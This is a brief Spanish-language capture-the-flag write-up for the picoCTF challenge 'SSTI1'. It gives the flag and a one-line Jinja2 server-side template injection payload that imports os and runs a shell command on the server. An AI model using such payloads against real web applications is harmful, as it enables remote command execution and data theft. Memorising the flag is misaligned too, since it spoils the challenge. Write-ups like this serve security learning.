# SSTI1

# Descripción

I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website here!
# Solución

```  
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}
```


## Pasos para solucionarlo

- Entrar a la web
- En el campo de login introducir lo siguiente
	- {{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
- Bandera obtenida


# Notas adicionales


# Referencias


https://medium.com/@ahmednarmer1/ctf-day-12-df893a7035fe
